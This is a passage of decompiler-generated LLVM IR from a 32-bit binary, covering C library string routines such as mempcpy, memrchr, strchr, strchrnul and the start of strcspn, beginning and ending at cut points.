  br i1 %v9_13d70, label %bb36, label %dec_label_pc_13d7c.backedge

bb36:                                             ; preds = %dec_label_pc_13d6c
  br label %dec_label_pc_13db0

dec_label_pc_13da4.preheader:                     ; preds = %dec_label_pc_13d7c.backedge, %dec_label_pc_13d00
  %v0_13d50.lcssa = phi i32 [ %v0_13d04, %dec_label_pc_13d00 ], [ %v4_13d10, %dec_label_pc_13d7c.backedge ]
  %v0_13d2c.lcssa = phi i32 [ %v0_13d7c22, %dec_label_pc_13d00 ], [ %v1_13d2c, %dec_label_pc_13d7c.backedge ]
  %v2_13da47 = icmp eq i32 %v0_13d2c.lcssa, 0
  br i1 %v2_13da47, label %dec_label_pc_13dac, label %dec_label_pc_13d94

dec_label_pc_13d94:                               ; preds = %dec_label_pc_13da0, %dec_label_pc_13da4.preheader
  %v0_13da4.in = phi i32 [ %v0_13da4, %dec_label_pc_13da0 ], [ %v0_13d2c.lcssa, %dec_label_pc_13da4.preheader ]
  %v0_13da0 = phi i32 [ %v1_13da0, %dec_label_pc_13da0 ], [ %v0_13d50.lcssa, %dec_label_pc_13da4.preheader ]
  %v0_13da4 = add i32 %v0_13da4.in, -1
  %v1_13d94 = inttoptr i32 %v0_13da0 to i8*
  %v2_13d94 = load i8, i8* %v1_13d94, align 1
  %v3_13d94 = zext i8 %v2_13d94 to i32
  %v9_13d98 = icmp eq i32 %v3_13d94, %v1_13cd4
  br i1 %v9_13d98, label %dec_label_pc_13db0, label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d94
  %v1_13da0 = add i32 %v0_13da0, 1
  %v2_13da4 = icmp eq i32 %v0_13da4, 0
  br i1 %v2_13da4, label %dec_label_pc_13dac, label %dec_label_pc_13d94

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13da0, %dec_label_pc_13da4.preheader
  br label %dec_label_pc_13db0

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13cdc, %dec_label_pc_13d5c, %dec_label_pc_13d34, %dec_label_pc_13d94, %bb36, %bb, %dec_label_pc_13dac
  %v1_13db4 = phi i32 [ 0, %dec_label_pc_13dac ], [ %v1_13d48, %bb ], [ %v1_13d40, %bb36 ], [ %v0_13da0, %dec_label_pc_13d94 ], [ %v1_13d5c, %dec_label_pc_13d5c ], [ %v0_13d5059, %dec_label_pc_13d34 ], [ %v0_13cec, %dec_label_pc_13cdc ]
  ret i32 %v1_13db4

; uselistorder directives
  uselistorder i32 %v1_13d2c, { 1, 0, 2 }
  uselistorder i32 %v0_13d5059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_13d00, { 1, 0 }
  uselistorder i32 %v0_13d7c22, { 1, 2, 0 }
  uselistorder i32 %v0_13cec, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_13d04.pre, { 1, 0 }
  uselistorder i32 %v1_13cd4, { 7, 3, 4, 5, 6, 8, 0, 2, 1 }
  uselistorder label %dec_label_pc_13db0, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_13d7c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13d10, { 1, 0 }
  uselistorder label %dec_label_pc_13d00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cf8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_13dc0 = load i32, i32* @r4, align 4
  %v6_13dc0 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_13dd0 = call i32 @memcpy()
  %v0_13dd4 = load i32, i32* @r5, align 4
  %v1_13dd4 = load i32, i32* @r4, align 4
  %v2_13dd4 = add i32 %v1_13dd4, %v0_13dd4
  store i32 %v3_13dc0, i32* @r4, align 4
  store i32 %v6_13dc0, i32* @r5, align 4
  ret i32 %v2_13dd4
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_13de8 = urem i32 %arg2, 256
  store i32 %v1_13de8, i32* @r1, align 4
  %v2_13dec = add i32 %arg3, %arg1
  %v2_13e044 = icmp eq i32 %arg3, 0
  br i1 %v2_13e044, label %dec_label_pc_13e14, label %dec_label_pc_13e0c

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13e0c
  %v1_13df4 = add i32 %v0_13df4, -1
  %v2_13df4 = inttoptr i32 %v1_13df4 to i8*
  %v3_13df4 = load i8, i8* %v2_13df4, align 1
  %v4_13df4 = zext i8 %v3_13df4 to i32
  %v9_13df8 = icmp eq i32 %v4_13df4, %v1_13de8
  br i1 %v9_13df8, label %dec_label_pc_13eb4, label %dec_label_pc_13e00

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13df4
  %v1_13e00 = add i32 %v0_13e00, -1
  %v2_13e04 = icmp eq i32 %v1_13e00, 0
  br i1 %v2_13e04, label %dec_label_pc_13e14, label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %entry, %dec_label_pc_13e00
  %v0_13e00 = phi i32 [ %v1_13e00, %dec_label_pc_13e00 ], [ %arg3, %entry ]
  %v0_13df4 = phi i32 [ %v1_13df4, %dec_label_pc_13e00 ], [ %v2_13dec, %entry ]
  %v1_13e0c = urem i32 %v0_13df4, 4
  %v2_13e0c = icmp eq i32 %v1_13e0c, 0
  br i1 %v2_13e0c, label %dec_label_pc_13e14, label %dec_label_pc_13df4

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13e00, %dec_label_pc_13e0c, %entry
  %v0_13e9c13 = phi i32 [ %v2_13dec, %entry ], [ %v1_13df4, %dec_label_pc_13e00 ], [ %v0_13df4, %dec_label_pc_13e0c ]
  %v0_13e889 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_13e00 ], [ %v0_13e00, %dec_label_pc_13e0c ]
  %v4_13e14 = mul nuw nsw i32 %v1_13de8, 256
  %v5_13e14 = or i32 %v4_13e14, %v1_13de8
  %v4_13e18 = mul i32 %v5_13e14, 65536
  %v5_13e18 = or i32 %v4_13e18, %v5_13e14
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_13e889, 3
  br i1 %tmp, label %dec_label_pc_13e20, label %dec_label_pc_13ea8

dec_label_pc_13e20:                               ; preds = %dec_label_pc_13e14, %dec_label_pc_13e88.backedge
  %v0_13e3c40 = phi i32 [ %v1_13e3c, %dec_label_pc_13e88.backedge ], [ %v0_13e889, %dec_label_pc_13e14 ]
  %v0_13e2039 = phi i32 [ %v1_13e20, %dec_label_pc_13e88.backedge ], [ %v0_13e9c13, %dec_label_pc_13e14 ]
  %v1_13e20 = add i32 %v0_13e2039, -4
  %v2_13e20 = inttoptr i32 %v1_13e20 to i32*
  %v3_13e20 = load i32, i32* %v2_13e20, align 4
  %v2_13e24 = xor i32 %v3_13e20, %v5_13e18
  %v2_13e28 = add i32 %v2_13e24, 2130640639
  store i32 %v2_13e28, i32* @ip, align 4
  %v1_13e2c = sub i32 -1, %v2_13e24
  %v2_13e30 = xor i32 %v2_13e28, %v1_13e2c
  %v2_13e34 = and i32 %v2_13e30, -2130640640
  %v2_13e38 = icmp eq i32 %v2_13e34, 0
  %v1_13e3c = add i32 %v0_13e3c40, -4
  br i1 %v2_13e38, label %dec_label_pc_13e88.backedge, label %dec_label_pc_13e44

dec_label_pc_13e88.backedge:                      ; preds = %dec_label_pc_13e20, %dec_label_pc_13e7c
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_13e3c, 3
  br i1 %tmp46, label %dec_label_pc_13e20, label %dec_label_pc_13ea8

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e20
  %v1_13e44 = add i32 %v0_13e2039, -1
  %v2_13e44 = inttoptr i32 %v1_13e44 to i8*
  %v3_13e44 = load i8, i8* %v2_13e44, align 1
  %v4_13e44 = zext i8 %v3_13e44 to i32
  %v9_13e48 = icmp eq i32 %v4_13e44, %v1_13de8
  br i1 %v9_13e48, label %dec_label_pc_13e74, label %dec_label_pc_13e54

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e44
  %v1_13e54 = add i32 %v0_13e2039, -2
  %v2_13e54 = inttoptr i32 %v1_13e54 to i8*
  %v3_13e54 = load i8, i8* %v2_13e54, align 1
  %v4_13e54 = zext i8 %v3_13e54 to i32
  %v9_13e58 = icmp eq i32 %v4_13e54, %v1_13de8
  br i1 %v9_13e58, label %dec_label_pc_13e74, label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e54
  %v1_13e64 = add i32 %v0_13e2039, -3
  %v2_13e64 = inttoptr i32 %v1_13e64 to i8*
  %v3_13e64 = load i8, i8* %v2_13e64, align 1
  %v4_13e64 = zext i8 %v3_13e64 to i32
  %v9_13e68 = icmp eq i32 %v4_13e64, %v1_13de8
  br i1 %v9_13e68, label %dec_label_pc_13e74, label %dec_label_pc_13e7c

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e64, %dec_label_pc_13e54, %dec_label_pc_13e44
  %v0_13e74 = phi i32 [ %v1_13e64, %dec_label_pc_13e64 ], [ %v1_13e54, %dec_label_pc_13e54 ], [ %v1_13e44, %dec_label_pc_13e44 ]
  br label %dec_label_pc_13eb4

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e64
  %v1_13e7c = inttoptr i32 %v1_13e20 to i8*
  %v2_13e7c = load i8, i8* %v1_13e7c, align 1
  %v3_13e7c = zext i8 %v2_13e7c to i32
  %v9_13e80 = icmp eq i32 %v3_13e7c, %v1_13de8
  br i1 %v9_13e80, label %dec_label_pc_13eb4, label %dec_label_pc_13e88.backedge

dec_label_pc_13e9c:                               ; preds = %dec_label_pc_13ea8
  %v1_13ea8 = add i32 %v0_13ea8, -1
  %v1_13e9c = add i32 %v0_13e9c, -1
  %v2_13e9c = inttoptr i32 %v1_13e9c to i8*
  %v3_13e9c = load i8, i8* %v2_13e9c, align 1
  %v4_13e9c = zext i8 %v3_13e9c to i32
  %v9_13ea0 = icmp eq i32 %v4_13e9c, %v1_13de8
  br i1 %v9_13ea0, label %dec_label_pc_13eb4, label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e14, %dec_label_pc_13e88.backedge, %dec_label_pc_13e9c
  %v0_13e9c = phi i32 [ %v1_13e9c, %dec_label_pc_13e9c ], [ %v0_13e9c13, %dec_label_pc_13e14 ], [ %v1_13e20, %dec_label_pc_13e88.backedge ]
  %v0_13ea8 = phi i32 [ %v1_13ea8, %dec_label_pc_13e9c ], [ %v0_13e889, %dec_label_pc_13e14 ], [ %v1_13e3c, %dec_label_pc_13e88.backedge ]
  %v2_13ea8 = icmp eq i32 %v0_13ea8, 0
  br i1 %v2_13ea8, label %dec_label_pc_13eb0, label %dec_label_pc_13e9c

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea8
  br label %dec_label_pc_13eb4

dec_label_pc_13eb4:                               ; preds = %dec_label_pc_13df4, %dec_label_pc_13e7c, %dec_label_pc_13e9c, %dec_label_pc_13e74, %dec_label_pc_13eb0
  %v1_13eb8 = phi i32 [ %v0_13e74, %dec_label_pc_13e74 ], [ 0, %dec_label_pc_13eb0 ], [ %v1_13e9c, %dec_label_pc_13e9c ], [ %v1_13e20, %dec_label_pc_13e7c ], [ %v1_13df4, %dec_label_pc_13df4 ]
  ret i32 %v1_13eb8

; uselistorder directives
  uselistorder i32 %v0_13ea8, { 1, 0 }
  uselistorder i32 %v1_13e3c, { 1, 0, 2 }
  uselistorder i32 %v1_13e20, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_13e2039, { 3, 2, 1, 0 }
  uselistorder i32 %v5_13e14, { 1, 0 }
  uselistorder i32 %v0_13e889, { 1, 2, 0 }
  uselistorder i32 %v0_13df4, { 1, 0, 2 }
  uselistorder i32 %v2_13dec, { 1, 0 }
  uselistorder i32 %v1_13de8, { 7, 3, 4, 5, 6, 8, 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13eb4, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_13ea8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13e88.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13e20, { 1, 0 }
  uselistorder label %dec_label_pc_13e14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e0c, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_13ec8 = urem i32 %arg1, 256
  %v0_13ee83 = load i32, i32* @r0, align 4
  %v1_13ee84 = urem i32 %v0_13ee83, 4
  %v2_13ee85 = icmp eq i32 %v1_13ee84, 0
  br i1 %v2_13ee85, label %dec_label_pc_13ef0, label %dec_label_pc_13ed0

dec_label_pc_13ed0:                               ; preds = %entry, %dec_label_pc_13ee4
  %v0_13ee4 = phi i32 [ %v1_13ee4, %dec_label_pc_13ee4 ], [ %v0_13ee83, %entry ]
  %v1_13ed0 = inttoptr i32 %v0_13ee4 to i8*
  %v2_13ed0 = load i8, i8* %v1_13ed0, align 1
  %v3_13ed0 = zext i8 %v2_13ed0 to i32
  store i32 %v3_13ed0, i32* @r3, align 4
  %v9_13ed4 = icmp eq i32 %v3_13ed0, %v1_13ec8
  br i1 %v9_13ed4, label %dec_label_pc_13fa4, label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ed0
  %v2_13edc = icmp eq i8 %v2_13ed0, 0
  br i1 %v2_13edc, label %dec_label_pc_13fa0, label %dec_label_pc_13ee4

dec_label_pc_13ee4:                               ; preds = %dec_label_pc_13edc
  %v1_13ee4 = add i32 %v0_13ee4, 1
  %v1_13ee8 = urem i32 %v1_13ee4, 4
  %v2_13ee8 = icmp eq i32 %v1_13ee8, 0
  br i1 %v2_13ee8, label %dec_label_pc_13ef0, label %dec_label_pc_13ed0

dec_label_pc_13ef0:                               ; preds = %dec_label_pc_13ee4, %entry
  %v0_13ef4 = phi i32 [ %v0_13ee83, %entry ], [ %v1_13ee4, %dec_label_pc_13ee4 ]
  %v4_13ef0 = mul nuw nsw i32 %v1_13ec8, 256
  %v5_13ef0 = or i32 %v4_13ef0, %v1_13ec8
  %v4_13ef8 = mul i32 %v5_13ef0, 65536
  %v5_13ef8 = or i32 %v4_13ef8, %v5_13ef0
  br label %dec_label_pc_13efc

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13f98, %dec_label_pc_13f38, %dec_label_pc_13ef0
  %v0_13f60 = phi i32 [ %v0_13ef4, %dec_label_pc_13ef0 ], [ %v4_13efc, %dec_label_pc_13f38 ], [ %v4_13efc, %dec_label_pc_13f98 ]
  %v1_13efc = inttoptr i32 %v0_13f60 to i32*
  %v2_13efc = load i32, i32* %v1_13efc, align 4
  %v4_13efc = add i32 %v0_13f60, 4
  %v2_13f04 = xor i32 %v2_13efc, %v5_13ef8
  %v2_13f08 = add i32 %v2_13f04, 2130640639
  store i32 %v2_13f08, i32* @ip, align 4
  %v2_13f10 = add i32 %v2_13efc, 2130640639
  %v1_13f14 = sub i32 -1, %v2_13efc
  %v2_13f18 = xor i32 %v2_13f10, %v1_13f14
  %v2_13f24 = and i32 %v2_13f18, -2130640640
  store i32 %v2_13f24, i32* @r1, align 4
  %v2_13f2c = icmp eq i32 %v2_13f24, 0
  br i1 %v2_13f2c, label %dec_label_pc_13f38, label %dec_label_pc_13f40

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13efc
  %v1_13f20 = sub i32 -1, %v2_13f04
  %v2_13f28 = xor i32 %v2_13f08, %v1_13f20
  %v2_13f30 = and i32 %v2_13f28, -2130640640
  %v2_13f38 = icmp eq i32 %v2_13f30, 0
  br i1 %v2_13f38, label %dec_label_pc_13efc, label %dec_label_pc_13f40

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13efc, %dec_label_pc_13f38
  %v2_13f40 = inttoptr i32 %v0_13f60 to i8*
  %v3_13f40 = load i8, i8* %v2_13f40, align 1
  %v4_13f40 = zext i8 %v3_13f40 to i32
  store i32 %v4_13f40, i32* @r3, align 4
  %v9_13f44 = icmp eq i32 %v4_13f40, %v1_13ec8
  br i1 %v9_13f44, label %dec_label_pc_13fa4, label %dec_label_pc_13f50

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f40
  %v2_13f50 = icmp eq i8 %v3_13f40, 0
  br i1 %v2_13f50, label %dec_label_pc_13fa0, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f50
  %v1_13f58 = add i32 %v0_13f60, 1
  %v2_13f58 = inttoptr i32 %v1_13f58 to i8*
  %v3_13f58 = load i8, i8* %v2_13f58, align 1
  %v4_13f58 = zext i8 %v3_13f58 to i32
  store i32 %v4_13f58, i32* @r3, align 4
  %v9_13f5c = icmp eq i32 %v4_13f58, %v1_13ec8
  br i1 %v9_13f5c, label %dec_label_pc_13fa4, label %dec_label_pc_13f68

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13f58
  %v2_13f68 = icmp eq i8 %v3_13f58, 0
  br i1 %v2_13f68, label %dec_label_pc_13fa0, label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f68
  %v1_13f70 = add i32 %v0_13f60, 2
  %v2_13f70 = inttoptr i32 %v1_13f70 to i8*
  %v3_13f70 = load i8, i8* %v2_13f70, align 1
  %v4_13f70 = zext i8 %v3_13f70 to i32
  store i32 %v4_13f70, i32* @r3, align 4
  %v9_13f74 = icmp eq i32 %v4_13f70, %v1_13ec8
  br i1 %v9_13f74, label %dec_label_pc_13fa4, label %dec_label_pc_13f80

dec_label_pc_13f80:                               ; preds = %dec_label_pc_13f70
  %v2_13f80 = icmp eq i8 %v3_13f70, 0
  br i1 %v2_13f80, label %dec_label_pc_13fa0, label %dec_label_pc_13f88

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f80
  %v1_13f88 = add i32 %v0_13f60, 3
  %v2_13f88 = inttoptr i32 %v1_13f88 to i8*
  %v3_13f88 = load i8, i8* %v2_13f88, align 1
  %v4_13f88 = zext i8 %v3_13f88 to i32
  store i32 %v4_13f88, i32* @r3, align 4
  %v9_13f8c = icmp eq i32 %v4_13f88, %v1_13ec8
  br i1 %v9_13f8c, label %dec_label_pc_13fa4, label %dec_label_pc_13f98

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f88
  %v2_13f98 = icmp eq i8 %v3_13f88, 0
  br i1 %v2_13f98, label %dec_label_pc_13fa0, label %dec_label_pc_13efc

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13edc, %dec_label_pc_13f98, %dec_label_pc_13f80, %dec_label_pc_13f68, %dec_label_pc_13f50
  br label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13ed0, %dec_label_pc_13f88, %dec_label_pc_13f70, %dec_label_pc_13f58, %dec_label_pc_13f40, %dec_label_pc_13fa0
  %v1_13fa8 = phi i32 [ 0, %dec_label_pc_13fa0 ], [ %v1_13f88, %dec_label_pc_13f88 ], [ %v1_13f70, %dec_label_pc_13f70 ], [ %v1_13f58, %dec_label_pc_13f58 ], [ %v0_13f60, %dec_label_pc_13f40 ], [ %v0_13ee4, %dec_label_pc_13ed0 ]
  ret i32 %v1_13fa8

; uselistorder directives
  uselistorder i32 %v4_13efc, { 1, 0 }
  uselistorder i32 %v2_13efc, { 0, 2, 1 }
  uselistorder i32 %v0_13f60, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13ef0, { 1, 0 }
  uselistorder i32 %v1_13ee4, { 1, 0, 2 }
  uselistorder i32 %v0_13ee83, { 2, 1, 0 }
  uselistorder i32 %v1_13ec8, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_13fa4, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_13fa0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_13f40, { 1, 0 }
  uselistorder label %dec_label_pc_13ed0, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_13fb8 = urem i32 %arg1, 256
  %v0_13fd82 = load i32, i32* @r0, align 4
  %v1_13fd83 = urem i32 %v0_13fd82, 4
  %v2_13fd84 = icmp eq i32 %v1_13fd83, 0
  br i1 %v2_13fd84, label %dec_label_pc_13fe0, label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %entry, %dec_label_pc_13fd4
  %v0_13fd4 = phi i32 [ %v1_13fd4, %dec_label_pc_13fd4 ], [ %v0_13fd82, %entry ]
  %v1_13fc0 = inttoptr i32 %v0_13fd4 to i8*
  %v2_13fc0 = load i8, i8* %v1_13fc0, align 1
  %v3_13fc0 = zext i8 %v2_13fc0 to i32
  %v9_13fc4 = icmp eq i32 %v3_13fc0, %v1_13fb8
  br i1 %v9_13fc4, label %dec_label_pc_14090, label %dec_label_pc_13fcc

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13fc0
  %v2_13fcc = icmp eq i8 %v2_13fc0, 0
  br i1 %v2_13fcc, label %dec_label_pc_14090, label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fcc
  %v1_13fd4 = add i32 %v0_13fd4, 1
  %v1_13fd8 = urem i32 %v1_13fd4, 4
  %v2_13fd8 = icmp eq i32 %v1_13fd8, 0
  br i1 %v2_13fd8, label %dec_label_pc_13fe0, label %dec_label_pc_13fc0

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_13fd4, %entry
  %v0_13fe4 = phi i32 [ %v0_13fd82, %entry ], [ %v1_13fd4, %dec_label_pc_13fd4 ]
  %v4_13fe0 = mul nuw nsw i32 %v1_13fb8, 256
  %v5_13fe0 = or i32 %v4_13fe0, %v1_13fb8
  %v4_13fe8 = mul i32 %v5_13fe0, 65536
  %v5_13fe8 = or i32 %v4_13fe8, %v5_13fe0
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %dec_label_pc_14088, %dec_label_pc_14028, %dec_label_pc_13fe0
  %v0_14050 = phi i32 [ %v0_13fe4, %dec_label_pc_13fe0 ], [ %v4_13fec, %dec_label_pc_14028 ], [ %v4_13fec, %dec_label_pc_14088 ]
  %v1_13fec = inttoptr i32 %v0_14050 to i32*
  %v2_13fec = load i32, i32* %v1_13fec, align 4
  %v4_13fec = add i32 %v0_14050, 4
  %v2_13ff4 = xor i32 %v2_13fec, %v5_13fe8
  %v2_13ff8 = add i32 %v2_13ff4, 2130640639
  store i32 %v2_13ff8, i32* @ip, align 4
  %v2_14000 = add i32 %v2_13fec, 2130640639
  %v1_14004 = sub i32 -1, %v2_13fec
  %v2_14008 = xor i32 %v2_14000, %v1_14004
  %v2_14014 = and i32 %v2_14008, -2130640640
  store i32 %v2_14014, i32* @r1, align 4
  %v2_1401c = icmp eq i32 %v2_14014, 0
  br i1 %v2_1401c, label %dec_label_pc_14028, label %dec_label_pc_14030

dec_label_pc_14028:                               ; preds = %dec_label_pc_13fec
  %v1_14010 = sub i32 -1, %v2_13ff4
  %v2_14018 = xor i32 %v2_13ff8, %v1_14010
  %v2_14020 = and i32 %v2_14018, -2130640640
  %v2_14028 = icmp eq i32 %v2_14020, 0
  br i1 %v2_14028, label %dec_label_pc_13fec, label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %dec_label_pc_13fec, %dec_label_pc_14028
  %v2_14030 = inttoptr i32 %v0_14050 to i8*
  %v3_14030 = load i8, i8* %v2_14030, align 1
  %v4_14030 = zext i8 %v3_14030 to i32
  %v9_14034 = icmp eq i32 %v4_14030, %v1_13fb8
  br i1 %v9_14034, label %dec_label_pc_14090, label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_14030
  %v2_14040 = icmp eq i8 %v3_14030, 0
  br i1 %v2_14040, label %dec_label_pc_14090, label %dec_label_pc_14048

dec_label_pc_14048:                               ; preds = %dec_label_pc_14040
  %v1_14048 = add i32 %v0_14050, 1
  %v2_14048 = inttoptr i32 %v1_14048 to i8*
  %v3_14048 = load i8, i8* %v2_14048, align 1
  %v4_14048 = zext i8 %v3_14048 to i32
  %v9_1404c = icmp eq i32 %v4_14048, %v1_13fb8
  br i1 %v9_1404c, label %dec_label_pc_14090, label %dec_label_pc_14058

dec_label_pc_14058:                               ; preds = %dec_label_pc_14048
  %v2_14058 = icmp eq i8 %v3_14048, 0
  br i1 %v2_14058, label %dec_label_pc_14090, label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_14058
  %v1_14060 = add i32 %v0_14050, 2
  %v2_14060 = inttoptr i32 %v1_14060 to i8*
  %v3_14060 = load i8, i8* %v2_14060, align 1
  %v4_14060 = zext i8 %v3_14060 to i32
  %v9_14064 = icmp eq i32 %v4_14060, %v1_13fb8
  br i1 %v9_14064, label %dec_label_pc_14090, label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_14060
  %v2_14070 = icmp eq i8 %v3_14060, 0
  br i1 %v2_14070, label %dec_label_pc_14090, label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %dec_label_pc_14070
  %v1_14078 = add i32 %v0_14050, 3
  %v2_14078 = inttoptr i32 %v1_14078 to i8*
  %v3_14078 = load i8, i8* %v2_14078, align 1
  %v4_14078 = zext i8 %v3_14078 to i32
  %v9_1407c = icmp eq i32 %v4_14078, %v1_13fb8
  br i1 %v9_1407c, label %dec_label_pc_14090, label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %dec_label_pc_14078
  %v2_14088 = icmp eq i8 %v3_14078, 0
  br i1 %v2_14088, label %dec_label_pc_14090, label %dec_label_pc_13fec

dec_label_pc_14090:                               ; preds = %dec_label_pc_13fcc, %dec_label_pc_13fc0, %dec_label_pc_14088, %dec_label_pc_14078, %dec_label_pc_14070, %dec_label_pc_14060, %dec_label_pc_14058, %dec_label_pc_14048, %dec_label_pc_14040, %dec_label_pc_14030
  %v1_14094 = phi i32 [ %v1_14078, %dec_label_pc_14088 ], [ %v1_14078, %dec_label_pc_14078 ], [ %v1_14060, %dec_label_pc_14070 ], [ %v1_14060, %dec_label_pc_14060 ], [ %v1_14048, %dec_label_pc_14058 ], [ %v1_14048, %dec_label_pc_14048 ], [ %v0_14050, %dec_label_pc_14040 ], [ %v0_14050, %dec_label_pc_14030 ], [ %v0_13fd4, %dec_label_pc_13fc0 ], [ %v0_13fd4, %dec_label_pc_13fcc ]
  ret i32 %v1_14094

; uselistorder directives
  uselistorder i32 %v4_13fec, { 1, 0 }
  uselistorder i32 %v2_13fec, { 0, 2, 1 }
  uselistorder i32 %v0_14050, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_13fe0, { 1, 0 }
  uselistorder i32 %v1_13fd4, { 1, 0, 2 }
  uselistorder i32 %v0_13fd82, { 2, 1, 0 }
  uselistorder i32 %v1_13fb8, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_14090, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_14030, { 1, 0 }
  uselistorder label %dec_label_pc_13fc0, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_140a0 = load i32, i32* @r4, align 4
  store i32 %v3_140a0, i32* %stack_var_-16, align 4
  %v6_140a0 = load i32, i32* @r5, align 4
  %v9_140a0 = load i32, i32* @r6, align 4
  %v0_140a4 = load i32, i32* @r0, align 4
  %v0_140a8 = load i32, i32* @r1, align 4
  store i32 %v0_140a8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_140c48 = inttoptr i32 %v0_140a4 to i8*
  %v2_140c49 = load i8, i8* %v1_140c48, align 1
  %v3_140c410 = zext i8 %v2_140c49 to i32
  store i32 %v3_140c410, i32* @r1, align 4
  %v2_140c811 = icmp eq i8 %v2_140c49, 0
  store i32 %v0_140a8, i32* @r0, align 4
  %v1_140d012 = add i32 %v0_140a4, 1
  store i32 %v1_140d012, i32* @r4, align 4
  br i1 %v2_140c811, label %dec_label_pc_140d8, label %dec_label_pc_140b4

dec_label_pc_140b4:                               ; preds = %entry, %dec_label_pc_140c0
  %v3_140c414 = phi i32 [ %v3_140c4, %dec_label_pc_140c0 ], [ %v3_140c410, %entry ]
  %v0_140cc13 = phi i32 [ %v0_140cc.pre, %dec_label_pc_140c0 ], [ %v0_140a8, %entry ]
  %v2_140b4 = call i32 @__GI_strchr(i32 %v0_140cc13, i32 %v3_140c414)
  %v2_140b8 = icmp eq i32 %v2_140b4, 0
  %v0_140c0 = load i32, i32* @r5, align 4
  br i1 %v2_140b8, label %dec_label_pc_140c0, label %dec_label_pc_140d8

dec_label_pc_140c0:                               ; preds = %dec_label_pc_140b4
  %v1_140c0 = add i32 %v0_140c0, 1
  %v0_140c4.pre = load i32, i32* @r4, align 4
  %v0_140cc.pre = load i32, i32* @r6, align 4
  store i32 %v1_140c0, i32* @r5, align 4
  %v1_140c4 = inttoptr i32 %v0_140c4.pre to i8*
  %v2_140c4 = load i8, i8* %v1_140c4, align 1
  %v3_140c4 = zext i8 %v2_140c4 to i32
  store i32 %v3_140c4, i32* @r1, align 4
  %v2_140c8 = icmp eq i8 %v2_140c4, 0
  store i32 %v0_140cc.pre, i32* @r0, align 4
  %v1_140d0 = add i32 %v0_140c4.pre, 1
